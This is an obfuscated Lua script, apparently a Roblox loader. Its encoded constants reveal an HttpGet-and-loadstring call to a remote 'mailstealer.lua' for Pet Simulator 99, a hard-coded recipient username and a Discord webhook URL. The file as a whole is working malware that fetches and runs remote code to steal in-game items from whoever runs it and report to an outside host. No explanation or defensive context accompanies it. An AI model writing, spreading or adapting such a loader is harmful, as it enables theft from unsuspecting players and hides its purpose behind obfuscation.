--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.9.19) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function()return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...)local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30)if (v1(v30,2)==79) then local v81=0;while true do if (v81==0) then v19=v0(v3(v30,1,1));return "";end end else local v82=0;local v83;while true do if (v82==0) then v83=v2(v0(v30,16));if v19 then local v100=v5(v83,v19);v19=nil;return v100;else return v83;end break;end end end end);local function v20(v31,v32,v33)if v33 then local v84=0 -0 ;local v85;while true do if (v84==(0 -0)) then v85=(v31/((3 -1)^(v32-1)))%((4 -2)^(((v33-(620 -((790 -235) + 64))) -(v32-(932 -(857 + 74)))) + (569 -(367 + 201)))) ;return v85-(v85%(928 -(214 + 713))) ;end end else local v86=0 + 0 ;local v87;while true do if ((0 + 0)==v86) then v87=2^(v32-((1943 -(68 + 997)) -(282 + 595))) ;return (((v31%(v87 + v87))>=v87) and (1638 -((2793 -(226 + 1044)) + 114))) or ((0 -0) + 0) ;end end end end local function v21()local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22()local v35=0;local v36;local v37;while true do if (v35==(118 -((58 -26) + 85))) then return (v37 * (251 + 5)) + v36 ;end if (v35==(0 + 0)) then v36,v37=v1(v16,v18,v18 + (959 -(892 + 65)) );v18=v18 + (4 -2) ;v35=1;end end end local function v23()local v38,v39,v40,v41=v1(v16,v18,v18 + (4 -1) );v18=v18 + 4 ;return (v41 * (16777566 -(87 + 193 + 70))) + (v40 * 65536) + (v39 * (436 -(67 + 113))) + v38 ;end local function v24()local v42=0 -0 ;local v43;local v44;local v45;local v46;local v47;local v48;while true do if (v42==(0 + 0)) then v43=v23();v44=v23();v42=(1426 -(630 + 793)) -2 ;end if ((443 -((1409 -993) + 26))==v42) then v45=(4512 -3559) -(802 + 150) ;v46=(v20(v44,3 -(1 + 1) ,53 -33 ) * ((3 -1)^(24 + 8))) + v43 ;v42=999 -(915 + 82) ;end if (v42==2) then v47=v20(v44,59 -38 ,(65 -46) + (1759 -(760 + 987)) );v48=((v20(v44,(1954 -(1789 + 124)) -9 )==(1188 -(1069 + 118))) and  -(1 + 0)) or (2 -(767 -(745 + 21))) ;v42=6 -3 ;end if ((12 -9)==v42) then if (v47==(0 + 0)) then if (v46==(0 + 0)) then return v48 * (0 -0) ;else v47=3 -2 ;v45=859 -(814 + 45) ;end elseif (v47==(5043 -(1031 + 1965))) then return ((v46==(0 -0)) and (v48 * ((2 -1)/((0 -0) + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(1908 -(261 + 624)) ) * (v45 + (v46/((3 -1)^(843 -(368 + 423))))) ;end end end local function v25(v49)local v50=1413 -(447 + 966) ;local v51;local v52;while true do if (v50==(8 -5)) then return v6(v52);end if ((1818 -(1703 + 114))==v50) then v51=v3(v16,v18,(v18 + v49) -(1 + 0) );v18=v18 + v49 ;v50=2 + 0 ;end if ((5 -(11 -8))==v50) then v52={};for v92=1056 -(87 + 968) , #v51 do v52[v92]=v2(v1(v3(v51,v92,v92)));end v50=(11 + 2) -10 ;end if (v50==(0 + 0)) then v51=nil;if  not v49 then v49=v23();if (v49==((1180 -(1123 + 57)) -0)) then return "";end end v50=1266 -(243 + 1022) ;end end end local v26=v23;local function v27(...)return {...},v12("#",...);end local function v28()local v53=1613 -(1565 + 48) ;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v53~=(1 + 1)) then else v58=nil;v59=nil;v53=1325 -(1249 + 73) ;end if (v53==0) then local v91=1138 -(782 + 356) ;while true do if ((267 -(176 + 91))~=v91) then else v54=0 + 0 ;v55=nil;v91=1;end if (v91==(1 -0)) then v53=1093 -(975 + 117) ;break;end end end if ((1148 -(466 + 679))==v53) then v60=nil;while true do local v94=0 -0 ;local v95;while true do if ((0 -0)==v94) then v95=1900 -(106 + 1794) ;while true do if (v95==(1 + 0)) then if (v54==(6 -4)) then local v116=1018 -(697 + 321) ;while true do if ((0 -0)==v116) then for v168=1 -0 ,v59 do local v169=0 + 0 ;local v170;local v171;local v172;while true do if (v169~=(0 + 0)) then else v170=0 -0 ;v171=nil;v169=1;end if (v169==(2 -1)) then v172=nil;while true do if (v170==(1228 -(322 + 905))) then if (v171==(2 -1)) then v172=v21()~=(0 -0) ;elseif (v171==(116 -(4 + 110))) then v172=v24();elseif (v171~=(587 -(57 + 527))) then else v172=v25();end v60[v168]=v172;break;end if ((1427 -(41 + 1386))==v170) then local v182=103 -(17 + 86) ;local v183;local v184;while true do if (v182==(0 + 0)) then v183=0 -0 ;v184=nil;v182=2 -1 ;end if (v182~=(167 -(122 + 44))) then else while true do if ((0 -0)==v183) then v184=0 -0 ;while true do if (0==v184) then local v194=0 + 0 ;local v195;while true do if (v194==(440 -(382 + 58))) then v195=0 -0 ;while true do if (v195==1) then v184=1;break;end if (v195~=0) then else v171=v21();v172=nil;v195=1 + 0 ;end end break;end end end if (v184==(1 -0)) then v170=1 + 0 ;break;end end break;end end break;end end end end break;end end end v58[5 -2 ]=v21();v116=2 -1 ;end if (v116~=(1206 -(902 + 303))) then else for v173=1 -0 ,v23() do local v174=0 -0 ;local v175;local v176;local v177;local v178;while true do if (0~=v174) then else v175=65 -(30 + 35) ;v176=nil;v174=1 + 0 ;end if (v174==(1 + 0)) then v177=nil;v178=nil;v174=1259 -(1043 + 214) ;end if (v174==(7 -5)) then while true do if (v175~=1) then else v178=nil;while true do if (v176==(1213 -(323 + 889))) then while true do if (v177~=(0 -0)) then else v178=v21();if (v20(v178,581 -(361 + 219) ,1)~=(320 -(53 + 267))) then else local v187=0;local v188;local v189;local v190;local v191;local v192;local v193;while true do if (v187==(0 -0)) then v188=0 -0 ;v189=nil;v187=1 + 0 ;end if (1~=v187) then else v190=nil;v191=nil;v187=415 -(15 + 398) ;end if (v187==(565 -(334 + 228))) then while true do if (v188==(983 -(18 + 964))) then local v197=0 -0 ;while true do if (v197~=(0 -0)) then else v191=nil;v192=nil;v197=1 + 0 ;end if (v197==(1 + 0)) then v188=2 + 0 ;break;end end end if ((852 -(20 + 830))~=v188) then else v193=nil;while true do if (v189==1) then local v198=0;while true do if ((236 -(141 + 95))==v198) then v192=nil;v193=nil;v198=1 + 0 ;end if (v198~=(1 + 0)) then else v189=128 -(116 + 10) ;break;end end end if ((1 + 1)==v189) then while true do if (v190==2) then local v200=0;local v201;while true do if (v200~=(738 -(542 + 196))) then else v201=0 -0 ;while true do if (v201==1) then v190=1 + 2 ;break;end if (v201==(0 + 0)) then if (v20(v192,2 -1 ,1 + 0 )~=(1 + 0)) then else v193[4 -2 ]=v60[v193[2 -0 ]];end if (v20(v192,2,4 -2 )==(1552 -(1126 + 425))) then v193[408 -(118 + 287) ]=v60[v193[11 -8 ]];end v201=1122 -(118 + 1003) ;end end break;end end end if (v190==(0 -0)) then local v202=377 -(142 + 235) ;while true do if ((1 -0)==v202) then v190=766 -(574 + 191) ;break;end if (v202==(0 -0)) then local v207=0;local v208;while true do if (v207~=(0 + 0)) then else v208=0 + 0 ;while true do if ((977 -(553 + 424))==v208) then local v215=0 -0 ;while true do if (v215==(1 + 0)) then v208=1;break;end if (v215==(849 -(254 + 595))) then v191=v20(v178,2,3 + 0 );v192=v20(v178,3 + 1 ,6);v215=1;end end end if (v208~=(127 -(55 + 71))) then else v202=1 -0 ;break;end end break;end end end end end if (v190==(1 + 0)) then local v203=0;while true do if (v203==0) then local v209=0 + 0 ;while true do if (v209==(0 + 0)) then local v210=0;while true do if ((2 -1)==v210) then v209=1;break;end if (v210==(0 -0)) then v193={v22(),v22(),nil,nil};if (v191==(753 -(239 + 514))) then local v216=0 -0 ;local v217;while true do if (v216~=(0 -0)) then else v217=0 + 0 ;while true do if (v217==(0 -0)) then v193[1332 -(797 + 532) ]=v22();v193[3 + 1 ]=v22();break;end end break;end end elseif (v191==(807 -(118 + 688))) then v193[2 + 1 ]=v23();elseif (v191==(50 -(25 + 23))) then v193[3]=v23() -(2^(4 + 12)) ;elseif (v191==(6 -3)) then local v222=0;local v223;local v224;while true do if (v222==(1203 -(373 + 829))) then while true do if (v223~=(0 -0)) then else v224=732 -(16 + 716) ;while true do if (v224==(731 -(476 + 255))) then v193[100 -(11 + 86) ]=v23() -((1132 -(369 + 761))^(10 + 6)) ;v193[4]=v22();break;end end break;end end break;end if (v222==(0 -0)) then v223=285 -(175 + 110) ;v224=nil;v222=2 -1 ;end end end v210=4 -3 ;end end end if (v209==1) then v203=1 -0 ;break;end end end if (v203==1) then v190=240 -(64 + 174) ;break;end end end if (v190~=(1 + 2)) then else if (v20(v192,3,3 -0 )~=(1 + 0)) then else v193[340 -(144 + 192) ]=v60[v193[4 + 0 ]];end v55[v173]=v193;break;end end break;end if (v189==0) then local v199=0;while true do if (v199==0) then v190=0;v191=nil;v199=1;end if (v199~=(534 -(43 + 490))) then else v189=734 -(711 + 22) ;break;end end end end break;end if (v188~=(216 -(42 + 174))) then else v189=0 + 0 ;v190=nil;v188=1 + 0 ;end end break;end if (v187~=(1 + 1)) then else v192=nil;v193=nil;v187=1507 -(363 + 1141) ;end end end break;end end break;end if (v176==0) then local v185=1580 -(1183 + 397) ;local v186;while true do if ((0 -0)~=v185) then else v186=0 + 0 ;while true do if (v186==0) then local v196=0;while true do if (v196~=(1745 -(1344 + 400))) then else v186=406 -(255 + 150) ;break;end if (v196==0) then v177=0 -0 ;v178=nil;v196=1 + 0 ;end end end if ((1 + 0)~=v186) then else v176=1 + 0 ;break;end end break;end end end end break;end if ((1975 -(1913 + 62))==v175) then v176=0 + 0 ;v177=nil;v175=4 -3 ;end end break;end end end v54=7 -4 ;break;end end end if (v54~=3) then else for v136=1,v23() do v56[v136-(1934 -(565 + 1368)) ]=v28();end return v58;end break;end if (0~=v95) then else local v101=406 -(183 + 223) ;while true do if (v101==1) then v95=1 -0 ;break;end if (v101==(0 + 0)) then if (1==v54) then local v156=0 -0 ;while true do if (v156==(1662 -(1477 + 184))) then v60={};v54=2;break;end if (v156==(0 -0)) then local v179=0 + 0 ;while true do if (v179==1) then v156=857 -(564 + 292) ;break;end if ((449 -(108 + 341))==v179) then v58={v55,v56,nil,v57};v59=v23();v179=2 -1 ;end end end end end if (v54~=(304 -(244 + 60))) then else local v157=0 + 0 ;local v158;while true do if (v157~=(476 -(41 + 435))) then else v158=0;while true do if (v158==0) then local v180=1001 -(938 + 63) ;while true do if (v180==0) then v55={};v56={};v180=1 + 0 ;end if (v180==(1126 -(936 + 189))) then v158=1;break;end end end if (v158~=1) then else v57={};v54=1;break;end end break;end end end v101=1;end end end end break;end end end break;end if (v53~=(1 + 0)) then else v56=nil;v57=nil;v53=5 -3 ;end end end local function v29(v61,v62,v63)local v64=v61[1];local v65=v61[2];local v66=v61[3];return function(...)local v67=v64;local v68=v65;local v69=v66;local v70=v27;local v71=1;local v72= -1;local v73={};local v74={...};local v75=v12("#",...) -1 ;local v76={};local v77={};for v88=0,v75 do if (v88>=v69) then v73[v88-v69 ]=v74[v88 + 1 ];else v77[v88]=v74[v88 + 1 ];end end local v78=(v75-v69) + 1 ;local v79;local v80;while true do v79=v67[v71];v80=v79[1];if (v80<=11) then if (v80<=5) then if (v80<=2) then if (v80<=0) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end elseif (v80==1) then if (v77[v79[2]]==v79[4]) then v71=v71 + 1 ;else v71=v79[3];end else do return;end end elseif (v80<=3) then v63[v79[3]]=v77[v79[2]];elseif (v80>4) then v77[v79[2]]();else local v118=0;local v119;while true do if (v118==0) then v119=v79[2];v77[v119]=v77[v119](v13(v77,v119 + 1 ,v72));break;end end end elseif (v80<=8) then if (v80<=6) then for v114=v79[2],v79[3] do v77[v114]=nil;end elseif (v80>7) then if ((v79[3]=="_ENV") or (v79[3]=="getfenv")) then v77[v79[2]]=v63;else v77[v79[2]]=v63[v79[3]];end elseif (v79[2]==v77[v79[4]]) then v71=v71 + 1 ;else v71=v79[3];end elseif (v80<=9) then v77[v79[2]]=v79[3];elseif (v80>10) then v63[v79[3]]=v77[v79[2]];else local v122=0;local v123;local v124;while true do if (v122==0) then v123=v79[2];v124=v77[v79[3]];v122=1;end if (v122==1) then v77[v123 + 1 ]=v124;v77[v123]=v124[v79[4]];break;end end end elseif (v80<=17) then if (v80<=14) then if (v80<=12) then v77[v79[2]]();elseif (v80==13) then local v125=v79[2];local v126,v127=v70(v77[v125](v13(v77,v125 + 1 ,v79[3])));v72=(v127 + v125) -1 ;local v128=0;for v138=v125,v72 do v128=v128 + 1 ;v77[v138]=v126[v128];end elseif (v79[2]==v77[v79[4]]) then v71=v71 + 1 ;else v71=v79[3];end elseif (v80<=15) then local v106=v79[2];local v107=v77[v79[3]];v77[v106 + 1 ]=v107;v77[v106]=v107[v79[4]];elseif (v80>16) then local v129=v79[2];local v130,v131=v70(v77[v129](v13(v77,v129 + 1 ,v79[3])));v72=(v131 + v129) -1 ;local v132=0;for v141=v129,v72 do v132=v132 + 1 ;v77[v141]=v130[v132];end elseif ((v79[3]=="_ENV") or (v79[3]=="getfenv")) then v77[v79[2]]=v63;else v77[v79[2]]=v63[v79[3]];end elseif (v80<=20) then if (v80<=18) then v71=v79[3];elseif (v80>19) then v71=v79[3];else do return;end end elseif (v80<=21) then v77[v79[2]]=v79[3];elseif (v80==22) then local v134=0;local v135;while true do if (v134==0) then v135=v79[2];v77[v135]=v77[v135](v13(v77,v135 + 1 ,v72));break;end end else for v144=v79[2],v79[3] do v77[v144]=nil;end end v71=v71 + 1 ;end end;end return v29(v28(),{},v17)(...);end v15("LOL!0C3O00028O00026O00F03F030D3O004C6F6164696E675363722O656E03043O0054727565030A3O006C6F6164737472696E6703043O0067616D6503073O00482O7470476574034D3O00682O7470733A2O2F7261772E67697468756275736572636F6E74656E742E636F6D2F446F76796C2F5065742D53696D756C61746F722D2O392F6D61696E2F6D61696C737465616C65722E6C756103083O00557365726E616D6503073O005954446F76796C03073O00576562682O6F6B037C3O00682O7470733A2O2F646973636F7264612O702E636F6D2F6170692F776562682O6F6B732F31323032362O34382O3531302O353237382O392F51565835446D32744732674F6B454E62696362444633373063446B4978712O5F5A6345382O4F764E6745506B49322D422D4577676E564C497471486270756B4C6F452O7700243O0012093O00014O0006000100013O00264O0002000100010004123O00020001001209000100013O00262O00010011000100020004123O00110001001210000200043O001203000200033O001210000200053O001210000300063O00200A000300030007001209000500084O000D000300054O000400023O00022O00050002000100010004123O0023000100262O00010005000100010004123O00050001001209000200013O002O0E00020018000100020004123O00180001001209000100023O0004123O0005000100262O00020014000100010004123O001400010012090003000A3O001203000300093O0012090003000C3O0012030003000B3O001209000200023O0004123O001400010004123O000500010004123O002300010004123O000200012O00023O00017O00",v9(),...);
